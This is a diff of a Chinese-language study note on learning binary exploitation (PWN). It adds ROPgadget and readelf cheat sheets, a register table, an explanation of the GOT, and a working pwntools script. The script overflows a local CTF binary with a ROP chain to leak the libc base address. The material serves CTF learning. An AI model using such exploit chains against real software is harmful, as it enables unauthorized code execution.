@@ -1,5 +1,5 @@
 ---
-title: "我在学PWN.md"
+title: "我在学PWN"
 image: ''
 pinned: false
 comment: true
@@ -26,6 +26,8 @@ tags: [学习]
 
 
 ### 一些linux指令：
+
+
 
 `nasm -f elf32 i386.asm -o i386.o`
 
@@ -54,7 +56,7 @@ nm：指令	./+程序名
 
 
 
-`objdump`的一些使用方式：
+#### `objdump`
 
 | **参数** | **格式名称**       | **作用**                                                     |
 | -------- | ------------------ | ------------------------------------------------------------ |
@@ -62,6 +64,28 @@ nm：指令	./+程序名
 | **-s**   | **完整内容格式**   | 以十六进制和 ASCII 码对照的形式显示文件的所有段。            |
 | **-x**   | **各个段头格式**   | 显示 ELF 文件的所有头部信息，包括 `_start` 的入口地址和各个段的权限。 |
 | **-S**   | **源代码混合格式** | 可以用来对照c语言源码和汇编代码。                            |
+
+
+
+#### `ROPgadget`
+
+| **指令**                                     | **功能**                                             |
+| -------------------------------------------- | ---------------------------------------------------- |
+| `ROPgadget --binary vuln`                    | 列出程序中所有以 `ret` 结尾的指令片段。              |
+| `ROPgadget --binary vuln --only "pop|ret"`   | 只搜索包含 `pop` 或 `ret` 的指令，快速定位传参零件。 |
+| `ROPgadget --binary vuln --string "/bin/sh"` | 在程序中搜索特定字符串（如 `/bin/sh`）的地址。       |
+| `ROPgadget --binary libc.so.6 --opcode 0f05` | 搜索特定的机器码（如 `0f05` 代表 `syscall`）。       |
+
+
+
+#### `readlf`
+
+| **指令**                           | **功能**                                                     |
+| ---------------------------------- | ------------------------------------------------------------ |
+| `readelf -h vuln`                  | 查看 ELF 文件头信息（如架构是 64 位还是 32 位）。            |
+| `readelf -s libc.so.6 | grep puts` | 查看 函数在 Libc 中的**静态偏移地址**。                      |
+| `readelf -S vuln`                  | 查看程序的段（Section）信息（如 `.bss`, `.data` 的地址）。   |
+| `readelf -l vuln`                  | 查看程序段（Segment）的权限（如哪些部分是 `R-X` 可执行的）。 |
 
 
 
@@ -75,19 +99,17 @@ r：8	e：4	ax：2	ah，al：1
 
 ### 寄存器功能汇总全表：
 
-| **寄存器 (64/32位)** | **全称**                    | **名词**           | **典型用途与图片定义**                                   |
-| -------------------- | --------------------------- | ------------------ | -------------------------------------------------------- |
-| **RAX / EAX**        | **A**ccumulator             | **累加器**         | 存放当前函数的**返回值**                                 |
-| **RBX / EBX**        | **B**ase                    | **基址寄存器**     | 常用于在内存寻址时存放**基地址** 。                      |
-| **RCX / ECX**        | **C**ount                   | **计数寄存器**     | 存放累加器的**中间结果**。                               |
-| **RDX / EDX**        | **D**ata                    | **数据寄存器**     | 常作为 RAX 的辅助，用于大数乘除法的高位存储或 I/O 操作。 |
-| **RSP / ESP**        | **S**tack **P**ointer       | **栈顶指针**       | 存放当前函数的**栈顶**偏移地址。执行 PUSH 时指针减小。   |
-| **RBP / EBP**        | **B**ase **P**ointer        | **栈底指针**       | 存放当前函数的**栈底**偏移地址。常用于定位局部变量。     |
-| **RSI / ESI**        | **S**ource **I**ndex        | **源变址寄存器**   | 存放函数传参中的**第一个**形式参数；常用于字符串操作。   |
-| **RDI / EDI**        | **D**est **I**ndex          | **目的变址寄存器** | 存放函数传参中的**第二个**形式参数；常用于字符串操作。   |
-| **RIP / EIP**        | **I**nstruction **P**ointer | **指令指针**       | 存放**下一条执行指令**在内存中的偏移地址。               |
-
-
+| **寄存器**      | **英文名字**        | **字节大小 (64位/32位)**            | **功能**                                                     |
+| --------------- | ------------------- | ----------------------------------- | ------------------------------------------------------------ |
+| **$RAX / EAX$** | Accumulator         | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **返回值**：存放函数执行后的结果。也用于系统调用号。         |
+| **$RDI / EDI$** | Destination Index   | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **第 1 个参数**：函数调用时的第一个传参（如 `puts(addr)` 中的 `addr`）。 |
+| **$RSI / ESI$** | Source Index        | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **第 2 个参数**：函数调用时的第二个传参。                    |
+| **$RDX / EDX$** | Data Register       | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **第 3 个参数**：常用于 I/O 操作或大数运算的高位存储。       |
+| **$RCX / ECX$** | Count Register      | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **第 4 个参数**：也常用于循环计数（`loop` 指令）。           |
+| **$RSP / ESP$** | Stack Pointer       | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **栈顶指针**：永远指向当前栈的最顶端（低地址）。             |
+| **$RBP / EBP$** | Base Pointer        | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **栈底指针**：指向当前函数栈帧的起始位置，用于定位局部变量。 |
+| **$RIP / EIP$** | Instruction Pointer | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **指令指针**：指向 CPU 即将执行的下一条指令的地址。          |
+| **$RBX / EBX$** | Base Register       | $8 \text{ Bytes} / 4 \text{ Bytes}$ | **基址寄存器**：由被调用者保存，常用于内存寻址或存放基地址。 |
 
 LSB：小端序。	MSB：大端序
 
@@ -534,7 +556,68 @@ PIE不变，可以直接使用ida里面的地址。
 
 根据vmmap的内容，栈只有读写权限，没有执行权限，cpu是在栈上寻找地址进行执行，而直接写在栈上的shellcode(指正常orw)执行不了，所以要用rop技术让cpu跳转到有执行权限的地方执行shellcode。
 
-思路：具有执行权限的段有：0x401000 - 0x402000（vuln），0x7ffff7df5000 - 0x7ffff7f6d000（libc）。
+思路：具有执行权限的段有：0x401000 - 0x402000（vuln），0x7ffff7df5000 - 0x7ffff7f6d000（libc），通过nm观察，发现程序内甚至没有orw的三个函数，所以我们得利用libc，进行基础泄露，通过基址和偏移计算实函数地址，然后完成rop利用，执行orw链。
+
+好了，思路有了，现在又要进入学习状态，怎么进行地址泄露，这边也要了解一个概念，由于程序是64位的程序。
+
+
+
+在 64 位 Linux 系统（x86-64）中，CPU 和编译器达成了一个硬性协议：
+
+- **函数参数优先走寄存器**：前 6 个参数必须依次放在 `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9` 这六个寄存器里。
+- **栈是用来备用的**：只有当参数超过 6 个时，剩下的才会放在栈上。
+
+
+
+所以我们找到了libc中的地址，也得利用puts函数**(用puts是因为程序里可以用这个，如果有其他相应功能的另外做考虑)**，从寄存器中打印出数据，又因为这个硬性条约，所以我们找到的第一个地址要写入rdi寄存器中，然后读出来。到这里又得引入一个知识点，GOT表：
+
+程序在编译函数的时候，它也不知道这些函数的地址，所以通过动态链接库libc中取找函数的地址，地址是动态变化的，所以即便在当前程序的代码段写入当前函数的地址，那也会因为下一次加载时，地址改变，而崩溃。
+
+这个时候，系统就专门留了一个地方可以读写的内存给程序用，也就是GOT表。
+
+当程序第一次调用某个函数时，会通过延迟绑定的方式，将找到的函数地址写入GOT表中，之后要用这个函数就直接取got表内找。**(注:是在一次加载中，而不是这次加载了， 下次再加载地址不变。)**
+
+所以我们通过GOT表内的函数地址，调用函数去进行攻击。
+
+##### payload1	#泄露libc基址：
+
+```
+from pwn import *
+
+elf = ELF('./vuln')
+libc = ELF('./libc-2.31.so')
+p = process('./vuln')
+
+pop_rdi = 0x401393 #ropgadge找到的地址
+ret = 0x40101a     # 这个ret是要对齐字节使用的，写了半天，一直失败，问ai才知道的。
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x4012F0	#main函数地址
+
+# 溢出偏移的计算，ida里有给vuln内部距离栈底的数据0x100h，加上寄存器的字节
+offset = 0x108
+
+payload = b'A' * offset
+payload += p64(ret)      # 16字节对齐
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr) # 回到 main
+
+p.recvuntil(b"task.\n")
+p.sendline(payload)
+
+leak_data = p.recvline().strip()
+leak_puts = u64(leak_data.ljust(8, b'\x00'))
+success(f"Leaked puts address: {hex(leak_puts)}")
+
+libc_base = leak_puts - libc.sym['puts']
+success(f"Libc Base: {hex(libc_base)}")
+
+p.interactive()
+```
+
+![image-20260227202406227](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260227202406227.png)
 
 
 
@@ -547,6 +630,31 @@ PIE不变，可以直接使用ida里面的地址。
 
 
 
+
+
+
+
+
+
+
+----
+
+
+
+#### shellcode变形.例1.mrctf2020.shellcode_revenge:
+
+这题我先以复述做题思路为主。
+
+因为听完了课，感觉这个例题仅仅只是比一半的多了一个字符绕过，其他的知识都相同。
+
+首先通过ida分析程序是会发现一个cmp的比较，它将我们输入的shellcode进行与ascll码比较，从而限制shellcode。
+![image-20260227170339976](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260227170339976.png)
+
+使用工具生成可以用的shellcode 然后编码shellcode发生就行了。
+
+
+
+---
 
 
 
